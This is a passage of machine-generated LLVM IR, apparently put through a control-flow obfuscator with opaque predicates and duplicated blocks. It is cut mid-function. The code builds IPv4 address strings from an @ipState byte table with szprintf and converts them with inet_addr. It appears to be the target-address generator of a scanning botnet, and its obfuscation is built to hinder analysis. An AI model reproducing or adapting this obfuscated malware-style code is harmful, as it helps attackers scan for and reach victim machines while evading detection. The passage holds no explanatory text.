  %2329 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2330 = zext i8 %2329 to i32
  %2331 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2332 = zext i8 %2331 to i32
  %2333 = call i32 (i8*, i8*, ...) @szprintf(i8* %2328, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.299, i32 0, i32 0), i32 %2330, i32 %2332)
  br label %2334

; <label>:2334:                                   ; preds = %2327, %2324
  %2335 = load i32, i32* %1, align 4
  %2336 = icmp eq i32 %2335, 115
  br i1 %2336, label %2337, label %2344

; <label>:2337:                                   ; preds = %2334
  %2338 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2339 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2340 = zext i8 %2339 to i32
  %2341 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2342 = zext i8 %2341 to i32
  %2343 = call i32 (i8*, i8*, ...) @szprintf(i8* %2338, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.300, i32 0, i32 0), i32 %2340, i32 %2342)
  br label %2344

; <label>:2344:                                   ; preds = %2337, %2334
  %2345 = load i32, i32* %1, align 4
  %2346 = icmp eq i32 %2345, 116
  br i1 %2346, label %2347, label %2354

; <label>:2347:                                   ; preds = %2344
  %2348 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2349 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2350 = zext i8 %2349 to i32
  %2351 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2352 = zext i8 %2351 to i32
  %2353 = call i32 (i8*, i8*, ...) @szprintf(i8* %2348, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.301, i32 0, i32 0), i32 %2350, i32 %2352)
  br label %2354

; <label>:2354:                                   ; preds = %2347, %2344
  %2355 = load i32, i32* %1, align 4
  %2356 = icmp eq i32 %2355, 117
  br i1 %2356, label %2357, label %2364

; <label>:2357:                                   ; preds = %2354
  %2358 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2359 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2360 = zext i8 %2359 to i32
  %2361 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2362 = zext i8 %2361 to i32
  %2363 = call i32 (i8*, i8*, ...) @szprintf(i8* %2358, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.302, i32 0, i32 0), i32 %2360, i32 %2362)
  br label %2364

; <label>:2364:                                   ; preds = %2357, %2354
  %2365 = load i32, i32* @x.77
  %2366 = load i32, i32* @y.78
  %2367 = sub i32 %2365, 1
  %2368 = mul i32 %2365, %2367
  %2369 = urem i32 %2368, 2
  %2370 = icmp eq i32 %2369, 0
  %2371 = icmp slt i32 %2366, 10
  %2372 = or i1 %2370, %2371
  br i1 %2372, label %originalBB290, label %originalBB290alteredBB

originalBB290:                                    ; preds = %originalBB290alteredBB, %2364
  %2373 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2374 = call i32 @inet_addr(i8* %2373) #5
  %2375 = load i32, i32* @x.77
  %2376 = load i32, i32* @y.78
  %2377 = sub i32 %2375, 1
  %2378 = mul i32 %2375, %2377
  %2379 = urem i32 %2378, 2
  %2380 = icmp eq i32 %2379, 0
  %2381 = icmp slt i32 %2376, 10
  %2382 = or i1 %2380, %2381
  br i1 %2382, label %originalBBpart2292, label %originalBB290alteredBB

originalBBpart2292:                               ; preds = %originalBB290
  ret i32 %2374

originalBBalteredBB:                              ; preds = %originalBB, %26
  %2383 = load i32, i32* %1, align 4
  %2384 = icmp eq i32 %2383, 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  %2385 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2386 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2387 = zext i8 %2386 to i32
  %2388 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2389 = zext i8 %2388 to i32
  %2390 = call i32 (i8*, i8*, ...) @szprintf(i8* %2385, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.189, i32 0, i32 0), i32 %2387, i32 %2389)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %88
  %2391 = load i32, i32* %1, align 4
  %2392 = icmp eq i32 %2391, 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %107
  %2393 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2394 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2395 = zext i8 %2394 to i32
  %2396 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2397 = zext i8 %2396 to i32
  %2398 = call i32 (i8*, i8*, ...) @szprintf(i8* %2393, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.192, i32 0, i32 0), i32 %2395, i32 %2397)
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %150
  %2399 = load i32, i32* %1, align 4
  %2400 = icmp eq i32 %2399, 7
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %169
  %2401 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2402 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2403 = zext i8 %2402 to i32
  %2404 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2405 = zext i8 %2404 to i32
  %2406 = call i32 (i8*, i8*, ...) @szprintf(i8* %2401, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.195, i32 0, i32 0), i32 %2403, i32 %2405)
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %205
  %2407 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2408 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2409 = zext i8 %2408 to i32
  %2410 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2411 = zext i8 %2410 to i32
  %2412 = call i32 (i8*, i8*, ...) @szprintf(i8* %2407, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.196, i32 0, i32 0), i32 %2409, i32 %2411)
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %231
  %2413 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2414 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2415 = zext i8 %2414 to i32
  %2416 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2417 = zext i8 %2416 to i32
  %2418 = call i32 (i8*, i8*, ...) @szprintf(i8* %2413, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.197, i32 0, i32 0), i32 %2415, i32 %2417)
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %314
  %2419 = load i32, i32* %1, align 4
  %2420 = icmp eq i32 %2419, 17
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %333
  %2421 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2422 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2423 = zext i8 %2422 to i32
  %2424 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2425 = zext i8 %2424 to i32
  %2426 = call i32 (i8*, i8*, ...) @szprintf(i8* %2421, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.204, i32 0, i32 0), i32 %2423, i32 %2425)
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %356
  %2427 = load i32, i32* %1, align 4
  %2428 = icmp eq i32 %2427, 18
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %375
  %2429 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2430 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2431 = zext i8 %2430 to i32
  %2432 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2433 = zext i8 %2432 to i32
  %2434 = call i32 (i8*, i8*, ...) @szprintf(i8* %2429, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.205, i32 0, i32 0), i32 %2431, i32 %2433)
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %401
  %2435 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2436 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2437 = zext i8 %2436 to i32
  %2438 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2439 = zext i8 %2438 to i32
  %2440 = call i32 (i8*, i8*, ...) @szprintf(i8* %2435, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.206, i32 0, i32 0), i32 %2437, i32 %2439)
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %437
  %2441 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2442 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2443 = zext i8 %2442 to i32
  %2444 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2445 = zext i8 %2444 to i32
  %2446 = call i32 (i8*, i8*, ...) @szprintf(i8* %2441, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.208, i32 0, i32 0), i32 %2443, i32 %2445)
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %470
  %2447 = load i32, i32* %1, align 4
  %2448 = icmp eq i32 %2447, 23
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %516
  %2449 = load i32, i32* %1, align 4
  %2450 = icmp eq i32 %2449, 26
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %542
  %2451 = load i32, i32* %1, align 4
  %2452 = icmp eq i32 %2451, 27
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %571
  %2453 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2454 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2455 = zext i8 %2454 to i32
  %2456 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2457 = zext i8 %2456 to i32
  %2458 = call i32 (i8*, i8*, ...) @szprintf(i8* %2453, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.215, i32 0, i32 0), i32 %2455, i32 %2457)
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %597
  %2459 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2460 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2461 = zext i8 %2460 to i32
  %2462 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2463 = zext i8 %2462 to i32
  %2464 = call i32 (i8*, i8*, ...) @szprintf(i8* %2459, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.216, i32 0, i32 0), i32 %2461, i32 %2463)
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %630
  %2465 = load i32, i32* %1, align 4
  %2466 = icmp eq i32 %2465, 31
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %649
  %2467 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2468 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2469 = zext i8 %2468 to i32
  %2470 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2471 = zext i8 %2470 to i32
  %2472 = call i32 (i8*, i8*, ...) @szprintf(i8* %2467, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.218, i32 0, i32 0), i32 %2469, i32 %2471)
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %675
  %2473 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2474 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2475 = zext i8 %2474 to i32
  %2476 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2477 = zext i8 %2476 to i32
  %2478 = call i32 (i8*, i8*, ...) @szprintf(i8* %2473, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.219, i32 0, i32 0), i32 %2475, i32 %2477)
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %708
  %2479 = load i32, i32* %1, align 4
  %2480 = icmp eq i32 %2479, 34
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %727
  %2481 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2482 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2483 = zext i8 %2482 to i32
  %2484 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2485 = zext i8 %2484 to i32
  %2486 = call i32 (i8*, i8*, ...) @szprintf(i8* %2481, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.221, i32 0, i32 0), i32 %2483, i32 %2485)
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %750
  %2487 = load i32, i32* %1, align 4
  %2488 = icmp eq i32 %2487, 35
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %786
  %2489 = load i32, i32* %1, align 4
  %2490 = icmp eq i32 %2489, 37
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %822
  %2491 = load i32, i32* %1, align 4
  %2492 = icmp eq i32 %2491, 39
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %858
  %2493 = load i32, i32* %1, align 4
  %2494 = icmp eq i32 %2493, 41
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %954
  %2495 = load i32, i32* %1, align 4
  %2496 = icmp eq i32 %2495, 49
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %973
  %2497 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2498 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2499 = zext i8 %2498 to i32
  %2500 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2501 = zext i8 %2500 to i32
  %2502 = call i32 (i8*, i8*, ...) @szprintf(i8* %2497, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.235, i32 0, i32 0), i32 %2499, i32 %2501)
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %996
  %2503 = load i32, i32* %1, align 4
  %2504 = icmp eq i32 %2503, 50
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %1042
  %2505 = load i32, i32* %1, align 4
  %2506 = icmp eq i32 %2505, 53
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %1068
  %2507 = load i32, i32* %1, align 4
  %2508 = icmp eq i32 %2507, 54
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1087
  %2509 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2510 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2511 = zext i8 %2510 to i32
  %2512 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2513 = zext i8 %2512 to i32
  %2514 = call i32 (i8*, i8*, ...) @szprintf(i8* %2509, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.239, i32 0, i32 0), i32 %2511, i32 %2513)
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1120
  %2515 = load i32, i32* %1, align 4
  %2516 = icmp eq i32 %2515, 56
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1149
  %2517 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2518 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2519 = zext i8 %2518 to i32
  %2520 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2521 = zext i8 %2520 to i32
  %2522 = call i32 (i8*, i8*, ...) @szprintf(i8* %2517, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.242, i32 0, i32 0), i32 %2519, i32 %2521)
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1175
  %2523 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2524 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2525 = zext i8 %2524 to i32
  %2526 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2527 = zext i8 %2526 to i32
  %2528 = call i32 (i8*, i8*, ...) @szprintf(i8* %2523, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.243, i32 0, i32 0), i32 %2525, i32 %2527)
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1201
  %2529 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2530 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2531 = zext i8 %2530 to i32
  %2532 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2533 = zext i8 %2532 to i32
  %2534 = call i32 (i8*, i8*, ...) @szprintf(i8* %2529, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.244, i32 0, i32 0), i32 %2531, i32 %2533)
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1244
  %2535 = load i32, i32* %1, align 4
  %2536 = icmp eq i32 %2535, 62
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1270
  %2537 = load i32, i32* %1, align 4
  %2538 = icmp eq i32 %2537, 63
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1296
  %2539 = load i32, i32* %1, align 4
  %2540 = icmp eq i32 %2539, 64
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1322
  %2541 = load i32, i32* %1, align 4
  %2542 = icmp eq i32 %2541, 65
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1341
  %2543 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2544 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2545 = zext i8 %2544 to i32
  %2546 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2547 = zext i8 %2546 to i32
  %2548 = call i32 (i8*, i8*, ...) @szprintf(i8* %2543, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.250, i32 0, i32 0), i32 %2545, i32 %2547)
  br label %originalBB166

originalBB170alteredBB:                           ; preds = %originalBB170, %1364
  %2549 = load i32, i32* %1, align 4
  %2550 = icmp eq i32 %2549, 66
  br label %originalBB170

originalBB174alteredBB:                           ; preds = %originalBB174, %1383
  %2551 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2552 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2553 = zext i8 %2552 to i32
  %2554 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2555 = zext i8 %2554 to i32
  %2556 = call i32 (i8*, i8*, ...) @szprintf(i8* %2551, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.251, i32 0, i32 0), i32 %2553, i32 %2555)
  br label %originalBB174

originalBB178alteredBB:                           ; preds = %originalBB178, %1416
  %2557 = load i32, i32* %1, align 4
  %2558 = icmp eq i32 %2557, 68
  br label %originalBB178

originalBB182alteredBB:                           ; preds = %originalBB182, %1435
  %2559 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2560 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2561 = zext i8 %2560 to i32
  %2562 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2563 = zext i8 %2562 to i32
  %2564 = call i32 (i8*, i8*, ...) @szprintf(i8* %2559, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.253, i32 0, i32 0), i32 %2561, i32 %2563)
  br label %originalBB182

originalBB186alteredBB:                           ; preds = %originalBB186, %1461
  %2565 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2566 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2567 = zext i8 %2566 to i32
  %2568 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2569 = zext i8 %2568 to i32
  %2570 = call i32 (i8*, i8*, ...) @szprintf(i8* %2565, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.254, i32 0, i32 0), i32 %2567, i32 %2569)
  br label %originalBB186

originalBB190alteredBB:                           ; preds = %originalBB190, %1487
  %2571 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2572 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2573 = zext i8 %2572 to i32
  %2574 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2575 = zext i8 %2574 to i32
  %2576 = call i32 (i8*, i8*, ...) @szprintf(i8* %2571, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.255, i32 0, i32 0), i32 %2573, i32 %2575)
  br label %originalBB190

originalBB194alteredBB:                           ; preds = %originalBB194, %1533
  %2577 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2578 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2579 = zext i8 %2578 to i32
  %2580 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2581 = zext i8 %2580 to i32
  %2582 = call i32 (i8*, i8*, ...) @szprintf(i8* %2577, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.258, i32 0, i32 0), i32 %2579, i32 %2581)
  br label %originalBB194

originalBB198alteredBB:                           ; preds = %originalBB198, %1559
  %2583 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2584 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2585 = zext i8 %2584 to i32
  %2586 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2587 = zext i8 %2586 to i32
  %2588 = call i32 (i8*, i8*, ...) @szprintf(i8* %2583, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.259, i32 0, i32 0), i32 %2585, i32 %2587)
  br label %originalBB198

originalBB202alteredBB:                           ; preds = %originalBB202, %1585
  %2589 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2590 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2591 = zext i8 %2590 to i32
  %2592 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2593 = zext i8 %2592 to i32
  %2594 = call i32 (i8*, i8*, ...) @szprintf(i8* %2589, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.260, i32 0, i32 0), i32 %2591, i32 %2593)
  br label %originalBB202

originalBB206alteredBB:                           ; preds = %originalBB206, %1631
  %2595 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2596 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2597 = zext i8 %2596 to i32
  %2598 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2599 = zext i8 %2598 to i32
  %2600 = call i32 (i8*, i8*, ...) @szprintf(i8* %2595, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.263, i32 0, i32 0), i32 %2597, i32 %2599)
  br label %originalBB206

originalBB210alteredBB:                           ; preds = %originalBB210, %1654
  %2601 = load i32, i32* %1, align 4
  %2602 = icmp eq i32 %2601, 79
  br label %originalBB210

originalBB214alteredBB:                           ; preds = %originalBB214, %1680
  %2603 = load i32, i32* %1, align 4
  %2604 = icmp eq i32 %2603, 80
  br label %originalBB214

originalBB218alteredBB:                           ; preds = %originalBB218, %1699
  %2605 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2606 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2607 = zext i8 %2606 to i32
  %2608 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2609 = zext i8 %2608 to i32
  %2610 = call i32 (i8*, i8*, ...) @szprintf(i8* %2605, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.265, i32 0, i32 0), i32 %2607, i32 %2609)
  br label %originalBB218

originalBB222alteredBB:                           ; preds = %originalBB222, %1722
  %2611 = load i32, i32* %1, align 4
  %2612 = icmp eq i32 %2611, 81
  br label %originalBB222

originalBB226alteredBB:                           ; preds = %originalBB226, %1741
  %2613 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2614 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2615 = zext i8 %2614 to i32
  %2616 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2617 = zext i8 %2616 to i32
  %2618 = call i32 (i8*, i8*, ...) @szprintf(i8* %2613, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.266, i32 0, i32 0), i32 %2615, i32 %2617)
  br label %originalBB226

originalBB230alteredBB:                           ; preds = %originalBB230, %1764
  %2619 = load i32, i32* %1, align 4
  %2620 = icmp eq i32 %2619, 82
  br label %originalBB230

originalBB234alteredBB:                           ; preds = %originalBB234, %1803
  %2621 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2622 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2623 = zext i8 %2622 to i32
  %2624 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2625 = zext i8 %2624 to i32
  %2626 = call i32 (i8*, i8*, ...) @szprintf(i8* %2621, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.269, i32 0, i32 0), i32 %2623, i32 %2625)
  br label %originalBB234

originalBB238alteredBB:                           ; preds = %originalBB238, %1826
  %2627 = load i32, i32* %1, align 4
  %2628 = icmp eq i32 %2627, 85
  br label %originalBB238

originalBB242alteredBB:                           ; preds = %originalBB242, %1895
  %2629 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2630 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2631 = zext i8 %2630 to i32
  %2632 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %2633 = zext i8 %2632 to i32
  %2634 = call i32 (i8*, i8*, ...) @szprintf(i8* %2629, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.275, i32 0, i32 0), i32 %2631, i32 %2633)
  br label %originalBB242

originalBB246alteredBB:                           ; preds = %originalBB246, %1941
  %2635 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %2636 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %2637 = zext i8 %2636 to i32
